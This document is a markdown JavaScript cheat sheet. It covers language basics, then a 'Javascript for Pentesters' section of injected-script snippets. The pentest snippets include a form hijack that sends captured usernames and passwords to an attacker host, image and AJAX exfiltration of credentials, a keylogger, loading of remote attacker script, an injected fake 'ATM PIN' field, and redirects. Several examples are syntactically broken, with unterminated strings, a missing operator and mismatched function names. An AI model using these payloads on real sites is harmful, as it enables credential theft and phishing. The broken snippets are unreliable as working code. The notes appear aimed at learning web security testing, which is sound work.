# Javascript

## Table of Contents

- [Notes](#notes)
- [Utilities](#utilities)
- [Primitive Datatypes](#primitive-datatypes)
- [Variable Declaration](#variable-declaration)
- [Objects](#objects)
- [Arrays](#arrays)
- [Functions](#functions)
- [Constructors](#constructors)
- [Type Coercion](#type-coercion)
- [Scopes and Closures](#scopes-and-closures)
- [Javascript for Pentesters](#javascript-for-pentesters)
- [References](#references)

## Notes

* Root object holds all the global variables. Root object depends on the **context**. 
For **browser** context, root object is __window__ object. For **node** context, root object is __node__ object.
* There is a root global object **window** every time we execute javascript in browser. All the properties associated with windows objects
are also global.
* Whenever a **global variable** or function is created, a __new property__ on window object is created.
* Global variables can be accessed via __variable_name__ or __window.variable_name__
* Execution of javascript takes place in 2 steps
  1. **Compilation** Look for all the var declaration and create a scope
  2. **Interpretation** Use the scopes created in step 1 and start assigning values & executing
* Javascript is **single threaded** application. It is **event driven** and uses **callbacks**.
* Global Math Object https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Math
* Global Date object https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Date

## Utilities

```javascript
// Print output
console.log("The value is " + val);

// Check the type of variable
console.log(typeof val);

// Find length of string/array
myvar.length

// Wait for 1 sec and execute a function using callback
setTimeout(fn, 1000);
var fn = function(){
  console.log("Hello World !!");
};

// Find the element
window.document.getElementsByTagName("h1")

// Modify the HTML content
window.document.getElementsByTagName("h1")[1].innerHTML = "you are modified"

// Modify the link
document.getElementsByTagName("a")[1].href = "https://www.roguesecurity.in;

// Modify the image
document.getElementsByTagName('img')[0].src="https://attacker.com/image.png";

// Modify the form submit URL
document.forms[0].action = "http://attacker.com/";

// Create a new image (for data exfilteration)
new Image().src = "http://localhost:8001/?username="+username+"&password=" + password;

// Create new HTML element
var newElement = document.createElement("h1");

// split the url
var token = window.location.search.split('&')[1];

```

## Primitive Datatypes
* number (no separate float datatype)
* string
* boolean
* undefined
* null

## Variable Declaration

```javascript
// Declare number 
// Numbers are in "double-precision 64-bit" format
var value = 10;

// String
var value = "Hello World!!";

// Boolean
var value = true;

// undefined
// This type contains only 1 value which is 'undefined'
var value;

// null
// This type contains only 1 value which is 'null'
var value = null;
```

## Objects

```javascript

// Declare an object
var myObj1 = {};
var myObj2 = new Object();
var myObj3 = {
  "prop1": "Hello",
  "prop2": true,
  "prop3": 123
};

// Declare nested objects
var myObj4 = {
  "prop1": "Hello",
  "prop2": true,
  "prop2": 123,
  "prop3": {
    "innerProp": "Inner prop value"
  }
};

// Add properties to the object
myObj.prop1 = "Hello";

// Delete the object property
delete myObj.prop1;

// Read value from the property
var value = myObj.prop1;
var value = myObj["prop1"];
```

## Arrays
Arrays are also objects
```javascript
// Declare array
var myArray = ["Hello", "World"];

// Access array
var value = myArray[3];
var value = myArray["3"];

// Assign value to the array
myArray[3] = "some value"

// Check length of an array. length is the property of all the array
myArray.length

// Methods properties on array object
myArray.push(10);     // Add element at the end of the array
myArray.pop();        // Fetch & Remove element from the end of the array
myArray.shift();      // Fetch & Remove element from the start of the array
myArray.unshift("A"); // Add element at the start of the array
```

## Functions
* Functions are also objects
* No function overloading is possible
* While calling the function, we can pass any number of arguments
* While calling the function,  **arguments** (an object) and **this** are implicitly passed.
* **this** value will depend on the context in which function is called
* By default, every function returns __undefined__

```javascript

// Function Declaration
function myFunc(name){
  console.log('Hello ' + name);
}

// Function Expression
var myFunc = function foo(name){
  return 'Hello ' + name;
}

myFunc()

// Anonymous Function Expression
var myFunc = function(name){
  return 'Hello ' + name;
}

myFunc();

// Immediately Invoke Function Expression (IIFE)
(function(name){
  return 'Hello ' + name;
})();

// Using functions on objects
var person = {
  "firstName": "Hello",
  "lastName": "World",
  "getFullName": function(){
    return this.firstName + " " + this.lastName;
  }
};

// this depends on the context in which it is called. There are various ways to call the function
// Method 1: Global Context
myFunc()  // myFunc will receive this pointing to 'global' context

// Method 2: Object Context
myObj.myFunc()  // myFunc will receive this pointer pointing to the 'object' context

// Method 3: Calling Constructor Function
new Employee();   // new 'this' object will be created and returned.

// Method 4: Object context but passing this of different object
myObj.myFunc.call(myObj2) // myFunc will receive 'this' pointing to 'myObj2' context
```

## Constructors
* Constructor in javascript is just a __function__.
* As per naming convention, function constructors created using new should should start with CAPITAL letter
* Constructors can be created in 2 ways
  1. Manually create constructor object
  2. Create constructor using **new** keyword

```javascript

// Method 1: Manual constructor
function createEmployee(firstName, lastName, gender, designation) {
  // Create a empty object
  var newobj = {};
  
  newObj.firstName = firstName;
  newObj.lastName = lastName;
  newObj.gender = gender;
  newObj.designation = designation;
  
  // return object
  return newObj
}

var emp = createEmployee("Hello", "World", "F", "Staff");

// Method 2: Using new
function Employee(firstName, lastName, gender, designation) {
  // Implicit object creation on using 'new'
  // var this = {};
  
  this.firstName = firstName;
  this.lastName = lastName;
  this.gender = gender;
  this.designation = designation;
  
  // Implicit return object on using 'new'
  // return this;
}

var emp = new Employee("Hello", "World", "F", "Staff");
```

## Type Coercion
Automatic type conversion by javascript interpreter

Use **===** operator for precise check i.e for checking both value and type

```javascript
// number and string will become 'string'
var a = 123 + "4"; //Result: 1234

// string and bool will become 'bool'
// Non empty string will return true
var a = "hello";
if (a){

}

// number and bool will become bool
// Non 0 value returns true
var a = 1234;
if (a){

}
```

## Scopes and Closures
* Variable scopes are defined by using **function**
* Variables outside functions are the part of global scope and can be accessed by anyone in the particular context
* Reading undeclared variable results in error
* Writing undeclared variable results in creating a **new variable** in global scope. __use strict;__ prevents this behavior
* **Closuer** When function is passed as the argument, all the reference to the variables used inside the function are also passed.
Scope information of variables inside the functions are also passed.

```javascript
// Module pattern
// Create 'private' variables in javascript using scopes and closures
function createPerson() {
  
  // Define private variables here
  var firstName = "Hello";
  var lastName = "World";
  
  var returnObj = {
    // Define getters and setters here
    "getFirstName": function() {
      return firstName;
    },
    ...
  };
}

var person = createPerson();
console.log(person.getFirstName());
```

## Javascript for Pentesters

### Select list of all html elements by tag name (e.g. h1, p)
```javascript
window.document.getElementsByTagName("h1")
```

### Modify the value of a particular tag
```javascript
window.document.getElementsByTagName("h1")[1].innerHTML = "you are modified"
window.document.getElementsByTagName("h1")[1].textContent = "you are modified again"
```

### Modify the link on the page
```javascript
document.getElementsByTagName("a")[1].href = "https://www.roguesecurity.in;
```

### Change the image
```javascript
document.getElementsByTagName('img')[0].src="https://attacker.com/image.png";
```

### Get all the elements (textbox, button) of a form in form of an array
```javascript
document.forms[0].elements
```
### Get the value from the textbox
```javascript
document.forms[0].elements[0].value
```

### Modify form's submit action
```javascript
document.forms[0].action = "http://attacker.com/";
```

### Call the function on form submit
```javascript
document.forms[0].onsubmit = InterceptFunction;

function InterceptFunction(){
	// Do something
}
```

### Create a new image element on the page
```javascript
new Image().src = "http://localhost:8001/?username="+username+"&password=" + password;
```

### Hijack form submit
```javascript
document.forms[0].onsubmit = InterceptFunction;

function InterceptFunction() {
	var username = document.forms[0].elements[0].value;
	var password = document.forms[0].elements[1].value;
	
	new Image().src = "http://attackerdomain/?username="+username+"&password="password;
}
```

### Create new element and set the attributes
```javascript
var input = document.createElement("input");
input.setAttribute("type", "text");
input.setAttribute("class", "input-block-level");
input.setAttribute("placeholder", "ATM PIN");
input.setAttribute("name", "atmpin");

// Add element to the form
var previous = document.forms[0].elements[0];
document.forms[0].insertBefore(input, previous);
```

### Add and remove elements from the form
```javascript
var newElement = document.createElement("h1");
newElement.innerHTML = "You have been hacked !!"
document.forms[0].parentNode.appendChild(newElement);
document.forms[0].parentNode.removeChild(document.forms[0]);
```

### Capture the click event on the page
```javascript
// add event listener at document body level
document.body.addEventListener('click', ClickHandler, true);
function ClickListener(){
	alert('clicked !!');
```

### Redirect
```javascript
location.href = "http://attacker.com"
```

### Keylogger
```javascript
document.onkeypress = function(keystroke){
	key_pressed = String.fromCharCode(keystroke.which);
	alert("The key " + key_pressed + " is pressed");
}
```

### Add external javascript reference
```javascript
var newElement = document.createElement('script');
newElement.type = "text/javascript";
newElement.src = "http://attacker.com/hack.js";
document.body.appendChild(newElement);
}
```

### Autosubmit form
```javascript
window.setTimeout(fn, 1000);
var fn = function(){
	document.forms[0].action = "https://attacker.com/";
	document.forms[0].submit();
}
```

### AJAX GET request
```javascript
var username = document.forms[0].elements[0].value;
 
 var password = document.forms[0].elements[1].value;

 window.setTimeout(function(){
 
 var req = new XMLHttpRequest();

 req.open("GET", "http://localhost:8001/?username=" + username + "&password=" + password, true);

 req.send();
 }, 1000);
```

### AJAX read response
```javascript
var username = document.forms[0].elements[0].value;
 
 var password = document.forms[0].elements[1].value;

 // handler to process the response
req.onreadystatechange = function () {
if (req.readyState == 4 && req.status == 200){

  // HTML received
  document.getElementsById("someid").innerHTML = req.responseText;
  }
}

 window.setTimeout(function(){
 
 var req = new XMLHttpRequest();

 req.open("GET", "http://localhost:8001/?username=" + username + "&password=" + password, true);

 req.send();
 }, 1000);
```

### AJAX POST Request
```javascript
function AJAXRequest(){
// handler to process the response
req.onreadystatechange = function () {
  if (req.readyState == 4 && req.status == 200){
  // HTML received
  new Image().src = "http://attacker.com/?data=" + req.responseText;
  }
}
  var req = new XMLHttpRequest();
  req.open("POST", "http://victim.com/", true);

  req.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');

  req.send("user=john");
}
```



## References

https://javabrains.io/courses/corejs_jsfordev/

https://javabrains.io/courses/corejs_scopesclosures/

https://javabrains.io/courses/corejs_objectsprototypes/

https://www.pentesteracademy.com/course?id=11
